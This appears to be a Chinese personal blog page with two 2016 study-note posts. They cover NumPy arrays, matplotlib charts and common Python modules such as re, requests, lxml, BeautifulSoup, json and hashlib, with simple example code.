	  <time datetime="2016-06-05T15:53:56.000Z" itemprop="datePublished">2016-06-05</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Python科学计算相关模块学习"><a href="#Python科学计算相关模块学习" class="headerlink" title="Python科学计算相关模块学习"></a>Python科学计算相关模块学习</h1><h2 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h2><p>NumPy的主要对象是同种元素的多维数组。这是一个所有的元素都是一种类型、通过一个正整数元组索引的元素表格(通常是元素是数字)。在NumPy中维度(dimensions)叫做轴(axes)，轴的个数叫做秩(rank)。</p>
<p><strong>NumPy的数组类被称作ndarrayN维数组</strong></p>
<p>NumPy的数组类被称作ndarray。通常被称作数组。注意numpy.array和标准Python库类array.array并不相同，后者只处理一维数组和提供少量功能。更多重要ndarray对象属性有：</p>
<ul>
<li>ndarray.ndim</li>
</ul>
<p>数组轴的个数，在python的世界中，轴的个数被称作秩</p>
<ul>
<li>ndarray.shape</li>
</ul>
<p>数组的维度。这是一个指示数组在每个维度上大小的整数元组。例如一个n排m列的矩阵，它的shape属性将是(2,3),这个元组的长度显然是秩，即维度或者ndim属性</p>
<ul>
<li>ndarray.size</li>
</ul>
<p>数组元素的总个数，等于shape属性中元组元素的乘积。</p>
<ul>
<li>ndarray.dtype</li>
</ul>
<p>一个用来描述数组中元素类型的对象，可以通过创造或指定dtype使用标准Python类型。另外NumPy提供它自己的数据类型。</p>
<ul>
<li>ndarray.itemsize</li>
</ul>
<p>数组中每个元素的字节大小。例如，一个元素类型为float64的数组itemsiz属性值为8(=64/8),又如，一个元素类型为complex32的数组item属性为4(=32/8).</p>
<ul>
<li>ndarray.data</li>
</ul>
<p>包含实际数组元素的缓冲区，通常我们不需要使用这个属性，因为我们总是通过索引来使用数组中的元素。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Memory layout</span><br><span class="line"></span><br><span class="line">以下属性包含有关数组的内存布局的信息：</span><br><span class="line">ndarray--&gt;N-dimensional array </span><br><span class="line">ndarray.flags	有关数组的内存布局的信息。</span><br><span class="line">ndarray.shape	数组维数组。</span><br><span class="line">ndarray.strides	遍历数组时，在每个维度中步进的字节数组。</span><br><span class="line">ndarray.ndim	数组维数。</span><br><span class="line">ndarray.data	Python缓冲区对象指向数组的数据的开始。</span><br><span class="line">ndarray.size	数组中的元素数。</span><br><span class="line">ndarray.itemsize	一个数组元素的长度（以字节为单位）。</span><br><span class="line">ndarray.nbytes	数组的元素消耗的总字节数。</span><br><span class="line">ndarray.base	如果内存是来自某个其他对象的基本对象。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Item selection and manipulation</span><br><span class="line"></span><br><span class="line">对于采用轴关键字的数组方法，默认为None。如果axis None，则数组被视为1-D数组。axis的任何其他值表示操作应沿其进行的维度。</span><br><span class="line"></span><br><span class="line">ndarray.take（indices [，axis，out，mode]）	返回由给定索引处的a元素组成的数组。</span><br><span class="line">ndarray.put（indices，values [，mode]）	对于所有n，设置a.flat [n] = 在指数。</span><br><span class="line">ndarray.repeat（repeat[，axis]）	重复数组的元素。</span><br><span class="line">ndarray.choose（choices [，out，mode]）	使用索引数组从一组选择中构造新的数组。</span><br><span class="line">ndarray.sort（[axis，kind，order]）	就地对数组进行排序。</span><br><span class="line">ndarray.argsort（[axis，kind，order]）	返回将此数组排序的索引。</span><br><span class="line">ndarray.partition（kth [，axis，kind，order]）	重新排列数组中的元素，使得第k个位置的元素的值在排序数组中的位置。</span><br><span class="line">ndarray.argpartition（kth [，axis，kind，order]）	返回将对此数组进行分区的索引。</span><br><span class="line">ndarray.searchsorted（v [，side，sorter]）	查找索引，其中v的元素应插入到a以维持顺序。</span><br><span class="line">ndarray.nonzero()	返回非零元素的索引。</span><br><span class="line">ndarray.compress（condition [，axis，out]）	沿给定轴返回此数组的所选切片。</span><br><span class="line">ndarray.diagonal（[offset，axis1，axis2]）	返回指定的对角线。</span><br><span class="line"></span><br><span class="line">ndarray.argmax（[axis，out]）	沿给定轴的最大值的返回指数。</span><br><span class="line">ndarray.min（[axis，out，keepdims]）	沿给定轴返回最小值。</span><br><span class="line">ndarray.argmin（[axis，out]）	沿着a的给定轴的最小值的返回指数。</span><br><span class="line">ndarray.ptp（[axis，out]）	沿给定轴的峰到峰（最大 - 最小）值。</span><br><span class="line">ndarray.clip（[min，max，out]）	返回值限于[min， max]的数组。</span><br><span class="line">ndarray.conj()	复共轭所有元素。</span><br><span class="line">ndarray.round（[decimals，out]）	返回a，每个元素四舍五入为给定的小数位数。</span><br><span class="line">ndarray.trace（[offset，axis1，axis2，dtype，out]）	沿数组的对角线返回总和。</span><br><span class="line">ndarray.sum（[axis，dtype，out，keepdims]）	返回给定轴上的数组元素的总和。</span><br><span class="line">ndarray.cumsum（[axis，dtype，out]）	返回沿给定轴的元素的累积和。</span><br><span class="line">ndarray.mean（[axis，dtype，out，keepdims]）	返回沿给定轴的数组元素的平均值。</span><br><span class="line">ndarray.var（[axis，dtype，out，ddof，keepdims]）	沿给定轴返回数组元素的方差。</span><br><span class="line">ndarray.std（[axis，dtype，out，ddof，keepdims]）	返回给定轴上的数组元素的标准偏差。</span><br><span class="line">ndarray.prod（[axis，dtype，out，keepdims]）	返回给定轴上的数组元素的乘积</span><br><span class="line">ndarray.cumprod（[axis，dtype，out]）	返回沿给定轴的元素的累积乘积。</span><br><span class="line">ndarray.all（[axis，out，keepdims]）	如果所有元素均为True，则返回True。</span><br><span class="line">ndarray.any（[axis，out，keepdims]）	如果a的任何元素求值为True，则返回True。</span><br></pre></td></tr></table></figure>
<p>函数和方法(method)总览</p>
<p>这是个NumPy函数和方法分类排列目录。这些名字链接到NumPy示例,你可以看到这些函数起作用.</p>
<ul>
<li>创建数组</li>
</ul>
<p>arange, array, copy, empty, empty_like, eye, fromfile, fromfunction, identity, linspace, logspace, mgrid, ogrid, ones, ones_like, r , zeros, zeros_like </p>
<ul>
<li>转化</li>
</ul>
<p>astype, atleast 1d, atleast 2d, atleast 3d, mat </p>
<ul>
<li>操作</li>
</ul>
<p>array split, column stack, concatenate, diagonal, dsplit, dstack, hsplit, hstack, item, newaxis, ravel, repeat, reshape, resize, squeeze, swapaxes, take, transpose, vsplit, vstack </p>
<ul>
<li>询问</li>
</ul>
<p>all, any, nonzero, where </p>
<ul>
<li>排序</li>
</ul>
<p>argmax, argmin, argsort, max, min, ptp, searchsorted, sort </p>
<ul>
<li>运算</li>
</ul>
<p>choose, compress, cumprod, cumsum, inner, fill, imag, prod, put, putmask, real, sum </p>
<ul>
<li>基本统计  </li>
</ul>
<p>cov, mean, std, var </p>
<ul>
<li>基本线性代数</li>
</ul>
<p>cross, dot, outer, svd, vdot</p>
<p>tile函数 :   进行重复<br>def tile(A, reps) Inferred type: (A: Union[ndarray, Iterable], reps: Union[ndarray, Iterable]) -&gt; ndarray</p>
<h1 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h1><h2 id="2D图表"><a href="#2D图表" class="headerlink" title="2D图表"></a>2D图表</h2><p>Matplotlib中最基础的模块是pyplot。先从最简单的点图和线图开始，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib as mpl</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line"># 通过rcParams设置全局横纵轴字体大小</span><br><span class="line">mpl.rcParams[&apos;xtick.labelsize&apos;] = 24</span><br><span class="line">mpl.rcParams[&apos;ytick.labelsize&apos;] = 24</span><br><span class="line"></span><br><span class="line">np.random.seed(42)</span><br><span class="line"></span><br><span class="line"># x轴的采样点</span><br><span class="line">x = np.linspace(0, 5, 100)</span><br><span class="line"></span><br><span class="line"># 通过下面曲线加上噪声生成数据，所以拟合模型就用y了……</span><br><span class="line">y = 2*np.sin(x) + 0.3*x**2</span><br><span class="line">y_data = y + np.random.normal(scale=0.3, size=100)</span><br><span class="line"></span><br><span class="line"># figure()指定图表名称</span><br><span class="line">plt.figure(&apos;data&apos;)</span><br><span class="line"></span><br><span class="line"># &apos;.&apos;标明画散点图，每个散点的形状是个圆</span><br><span class="line">plt.plot(x, y_data, &apos;.&apos;)</span><br><span class="line"></span><br><span class="line"># 画模型的图，plot函数默认画连线图</span><br><span class="line">plt.figure(&apos;model&apos;)</span><br><span class="line">plt.plot(x, y)</span><br><span class="line"></span><br><span class="line"># 两个图画一起</span><br><span class="line">plt.figure(&apos;data &amp; model&apos;)</span><br><span class="line"></span><br><span class="line"># 通过&apos;k&apos;指定线的颜色，lw指定线的宽度</span><br><span class="line"># 第三个参数除了颜色也可以指定线形，比如&apos;r--&apos;表示红色虚线</span><br><span class="line"># 更多属性可以参考官网：http://matplotlib.org/api/pyplot_api.html</span><br><span class="line">plt.plot(x, y, &apos;k&apos;, lw=3)</span><br><span class="line"></span><br><span class="line"># scatter可以更容易地生成散点图</span><br><span class="line">plt.scatter(x, y_data)</span><br><span class="line"></span><br><span class="line"># 将当前figure的图保存到文件result.png</span><br><span class="line">plt.savefig(&apos;result.png&apos;)</span><br><span class="line"></span><br><span class="line"># 一定要加上这句才能让画好的图显示在屏幕上</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></p>
<h2 id="柱状或饼状类型的图"><a href="#柱状或饼状类型的图" class="headerlink" title="柱状或饼状类型的图"></a>柱状或饼状类型的图</h2><p>点和线图表只是最基本的用法，有的时候我们获取了分组数据要做对比，柱状或饼状类型的图或许更合适：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib as mpl</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">mpl.rcParams[&apos;axes.titlesize&apos;] = 20</span><br><span class="line">mpl.rcParams[&apos;xtick.labelsize&apos;] = 16</span><br><span class="line">mpl.rcParams[&apos;ytick.labelsize&apos;] = 16</span><br><span class="line">mpl.rcParams[&apos;axes.labelsize&apos;] = 16</span><br><span class="line">mpl.rcParams[&apos;xtick.major.size&apos;] = 0</span><br><span class="line">mpl.rcParams[&apos;ytick.major.size&apos;] = 0</span><br><span class="line"></span><br><span class="line"># 包含了狗，猫和猎豹的最高奔跑速度，还有对应的可视化颜色</span><br><span class="line">speed_map = &#123;</span><br><span class="line">    &apos;dog&apos;: (48, &apos;#7199cf&apos;),</span><br><span class="line">    &apos;cat&apos;: (45, &apos;#4fc4aa&apos;),</span><br><span class="line">    &apos;cheetah&apos;: (120, &apos;#e1a7a2&apos;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 整体图的标题</span><br><span class="line">fig = plt.figure(&apos;Bar chart &amp; Pie chart&apos;)</span><br><span class="line"></span><br><span class="line"># 在整张图上加入一个子图，121的意思是在一个1行2列的子图中的第一张</span><br><span class="line">ax = fig.add_subplot(121)</span><br><span class="line">ax.set_title(&apos;Running speed - bar chart&apos;)</span><br><span class="line"></span><br><span class="line"># 生成x轴每个元素的位置</span><br><span class="line">xticks = np.arange(3)</span><br><span class="line"></span><br><span class="line"># 定义柱状图每个柱的宽度</span><br><span class="line">bar_width = 0.5</span><br><span class="line"></span><br><span class="line"># 动物名称</span><br><span class="line">animals = speed_map.keys()</span><br><span class="line"></span><br><span class="line"># 奔跑速度</span><br><span class="line">speeds = [x[0] for x in speed_map.values()]</span><br><span class="line"></span><br><span class="line"># 对应颜色</span><br><span class="line">colors = [x[1] for x in speed_map.values()]</span><br><span class="line"></span><br><span class="line"># 画柱状图，横轴是动物标签的位置，纵轴是速度，定义柱的宽度，同时设置柱的边缘为透明</span><br><span class="line">bars = ax.bar(xticks, speeds, width=bar_width, edgecolor=&apos;none&apos;)</span><br><span class="line"></span><br><span class="line"># 设置y轴的标题</span><br><span class="line">ax.set_ylabel(&apos;Speed(km/h)&apos;)</span><br><span class="line"></span><br><span class="line"># x轴每个标签的具体位置，设置为每个柱的中央</span><br><span class="line">ax.set_xticks(xticks+bar_width/2)</span><br><span class="line"></span><br><span class="line"># 设置每个标签的名字</span><br><span class="line">ax.set_xticklabels(animals)</span><br><span class="line"></span><br><span class="line"># 设置x轴的范围</span><br><span class="line">ax.set_xlim([bar_width/2-0.5, 3-bar_width/2])</span><br><span class="line"></span><br><span class="line"># 设置y轴的范围</span><br><span class="line">ax.set_ylim([0, 125])</span><br><span class="line"></span><br><span class="line"># 给每个bar分配指定的颜色</span><br><span class="line">for bar, color in zip(bars, colors):</span><br><span class="line">    bar.set_color(color)</span><br><span class="line"></span><br><span class="line"># 在122位置加入新的图</span><br><span class="line">ax = fig.add_subplot(122)</span><br><span class="line">ax.set_title(&apos;Running speed - pie chart&apos;)</span><br><span class="line"></span><br><span class="line"># 生成同时包含名称和速度的标签</span><br><span class="line">labels = [&apos;&#123;&#125;\n&#123;&#125; km/h&apos;.format(animal, speed) for animal, speed in zip(animals, speeds)]</span><br><span class="line"></span><br><span class="line"># 画饼状图，并指定标签和对应颜色</span><br><span class="line">ax.pie(speeds, labels=labels, colors=colors)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h2 id="3D图表"><a href="#3D图表" class="headerlink" title="3D图表"></a>3D图表</h2><p>import matplotlib.pyplot as plt</p>
<h1 id="matrix-plot-lib"><a href="#matrix-plot-lib" class="headerlink" title="matrix plot lib"></a>matrix plot lib</h1><ul>
<li>plt.figure() 绘制多图，自定义画布大小 给图像标ID。</li>
<li>plt.subplot() ：设置画布划分以及图像在画布上输出的位置</li>
<li>plt.text()添加文字说明<ul>
<li>text()可以在图中的任意位置添加文字，并支持LaTex语法</li>
<li>xlable(), ylable()用于添加x轴和y轴标签</li>
<li>title()用于添加图的题目</li>
</ul>
</li>
<li>plt.annotate()文本注释</li>
<li>plt.xticks()/plt.yticks()设置轴记号</li>
<li>plt.legend()添加图例</li>
<li>plt.axes()</li>
</ul>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Pyhon 模块学习"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2016/05/05/Pyhon 模块学习/">Pyhon 模块</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2016/05/05/Pyhon 模块学习/" class="article-date">
	  <time datetime="2016-05-05T15:53:56.000Z" itemprop="datePublished">2016-05-05</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Pyhon-模块学习"><a href="#Pyhon-模块学习" class="headerlink" title="Pyhon 模块学习"></a>Pyhon 模块学习</h1><h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">re.compile(pattern[, flags])</span><br><span class="line"></span><br><span class="line">    re.compile 函数</span><br><span class="line">    compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</span><br><span class="line">    语法格式为：</span><br><span class="line"></span><br><span class="line">re.match(pattern, string, flags=0 # pattern	匹配的正则表达式</span><br><span class="line"></span><br><span class="line">re.search(pattern, string, flags=0)</span><br><span class="line">#re.search 扫描整个字符串并返回第一个成功的匹配。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import re</span><br><span class="line">line = &quot;Cats are smarter than dogs&quot;</span><br><span class="line">matchObj = re.match( r&apos;(.*) are (.*?) .*&apos;, line, re.M|re.I)</span><br><span class="line">if matchObj:</span><br><span class="line">    print &quot;matchObj.group() : &quot;, matchObj.group()</span><br><span class="line">    print &quot;matchObj.group(1) : &quot;, matchObj.group(1)</span><br><span class="line">    print &quot;matchObj.group(2) : &quot;, matchObj.group(2)</span><br><span class="line">else:   </span><br><span class="line">    print &quot;No match!!&quot;</span><br></pre></td></tr></table></figure>
<p><a href="http://www.runoob.com/python/python-reg-expressions.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-reg-expressions.html</a></p>
<h3 id="1-urllib-urllib2"><a href="#1-urllib-urllib2" class="headerlink" title="1. urllib  urllib2"></a>1. urllib  urllib2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user_agent = &apos;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&apos;# 将user_agent写入头信息</span><br><span class="line">values = &#123;&apos;name&apos; : &apos;Michael Foord&apos;,</span><br><span class="line">          	&apos;location&apos; : &apos;Northampton&apos;,</span><br><span class="line">          	&apos;language&apos; : &apos;Python&apos; </span><br><span class="line">&#125;</span><br><span class="line">headers = &#123; &apos;User-Agent&apos; : user_agent &#125;</span><br><span class="line">data = urllib.urlencode(values)</span><br><span class="line"></span><br><span class="line">req = urllibs2.request(url,data=data,headers)	</span><br><span class="line">response = urllib2.urlopen(req)	</span><br><span class="line"></span><br><span class="line">the_page = response.read()</span><br></pre></td></tr></table></figure>
<h3 id="2-requests"><a href="#2-requests" class="headerlink" title="2.requests"></a>2.requests</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">r = requests.post(&apos;https://api.github.com/some/endpoint&apos;, data=json.dumps(&#123;&apos;some&apos;: &apos;data&apos;&#125;))</span><br><span class="line">print r.json()</span><br><span class="line">print r.text</span><br><span class="line">print r.json()</span><br><span class="line">print r.read()</span><br><span class="line"></span><br><span class="line">r.content()</span><br><span class="line"></span><br><span class="line">tag</span><br></pre></td></tr></table></figure>
<h4 id="基于gevent开发的requests库"><a href="#基于gevent开发的requests库" class="headerlink" title="基于gevent开发的requests库"></a>基于gevent开发的requests库</h4><h3 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lxml库,用C语言实现的，性能比BeauitfulSoup库快。</span><br><span class="line">lxml 库：xpath，         BrautifulSoup 库 ： 遍历DOM；</span><br><span class="line"></span><br><span class="line">result[0].tag  // 标签</span><br><span class="line">result[0].text // 文本内容</span><br><span class="line">result[0].tail  // string对象，表示element闭合之后的尾迹。</span><br><span class="line">result[0].attrib // dictionary对象，表示附有的属性。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strip()  //python 函数去除字符</span><br></pre></td></tr></table></figure>
<ol>
<li>Element 为主要的类； from lxml import etree </li>
<li><p>​</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lxml.etree的方法：</span><br><span class="line">fromstring() // 用于解析字符串</span><br><span class="line">HTML() // 用于解析HTML对象</span><br><span class="line">XML()  // 解析XML 对象</span><br><span class="line">parse() // 解析 文件呢类型的对象</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">r = requests.post(url, params=params).text</span><br><span class="line">response = etree.HTML(r)</span><br><span class="line">result = response.xpath(&apos;//li/text()&apos;)</span><br><span class="line">print result</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="3-BeautifulSoup"><a href="#3-BeautifulSoup" class="headerlink" title="3.BeautifulSoup"></a>3.BeautifulSoup</h3><p>最主要的功能是从网页抓取数据。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Beautiful Soup 将复杂 HTML 文档转换成一个复杂的树形结构,每个节点都是 Python 对象,所有对象可以归纳为 4 种:</span><br><span class="line">    </span><br><span class="line">Tag ：</span><br><span class="line">NavigableString ： </span><br><span class="line">BeautifulSoup ：</span><br><span class="line">Comment：</span><br></pre></td></tr></table></figure>
<p><a href="http://beautifulsoup.readthedocs.io/zh_CN/latest/#id18" target="_blank" rel="noopener">http://beautifulsoup.readthedocs.io/zh_CN/latest/#id18</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">再谈BeautifulSoup</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">html = BeautifulSoup(html,&apos;lxml&apos;)</span><br><span class="line">html.select(&apos;选择器&apos;)</span><br><span class="line">html.find_all(&quot;tag&quot;, attrs=&#123;&quot;key&quot;: &quot;value&quot;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.get_text().split(&apos;\n&apos;)  ##split()函数分割字符串为列表，然后通过list[n]选择。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find()函数：  tag,attribuutes (属性） 参数常用</span><br><span class="line">find(tag,attributes,resursive,text,limit,keywords)</span><br><span class="line">findAll(tag,attribuutes,recusive,text,keywords)</span><br></pre></td></tr></table></figure>
<h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load()  json.loads() :json模块解码</span><br><span class="line"></span><br><span class="line">dump()  json.dump() : json模块编码 过jshon的dumps的模块可以把特定的对象序列化处理为字符串</span><br></pre></td></tr></table></figure>
<h3 id="4-sys"><a href="#4-sys" class="headerlink" title="4. sys"></a>4. sys</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">args = sys.argv</span><br><span class="line">url = &quot;&quot;  ##命令行输入</span><br><span class="line">if len (args)==2:</span><br><span class="line">    url = args [1]</span><br><span class="line">    verify(url)</span><br><span class="line">else:</span><br><span class="line">    print &quot;use :python %s url &quot; %(args[0])</span><br></pre></td></tr></table></figure>
<h3 id="hashlib-涉及安全散列和消息摘要"><a href="#hashlib-涉及安全散列和消息摘要" class="headerlink" title="hashlib 涉及安全散列和消息摘要"></a>hashlib 涉及安全散列和消息摘要</h3><ol>
<li>常用属性</li>
</ol>
<p>hashlib.algorithms<br>列出所有加密算法</p>
<p>h.digest_size<br>产生的散列字节大小。</p>
<p>h.block_size<br>哈希内部块的大小</p>
<ol start="2">
<li>常用方法</li>
</ol>
<p>hash.new([arg])<br>创建指定加密模式的hash对象</p>
<p>hash.update(arg)<br>更新哈希对象以字符串参数。如果同一个hash对象重复调用该方法，m.update(a); m.update(b) 等价于 m.update(a+b)</p>
<p>hash.digest()<br>返回摘要，作为二进制数据字符串值。</p>
<p>hash.hexdigest()<br>返回摘要，作为十六进制数据字符串值</p>
<p>hash.copy()<br>复制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">md5 = hashlib.md5() </span><br><span class="line">md5.update(&quot;I am Sin_Geek&quot;)  </span><br><span class="line">print md5.digest()  </span><br><span class="line">print md5.hexdigest() </span><br><span class="line">print &apos;block_size:&apos;, md5.block_size</span><br><span class="line">print &apos;digest_size:&apos;, md5.digest_size</span><br></pre></td></tr></table></figure>
<h3 id="openpyxlb-excel文档-操作"><a href="#openpyxlb-excel文档-操作" class="headerlink" title="openpyxlb excel文档 操作"></a>openpyxlb excel文档 操作</h3><p><a href="https://www.cnblogs.com/anpengapple/p/6399304.html?utm_source=itdadao&amp;utm_medium=referral" target="_blank" rel="noopener">https://www.cnblogs.com/anpengapple/p/6399304.html?utm_source=itdadao&amp;utm_medium=referral</a></p>
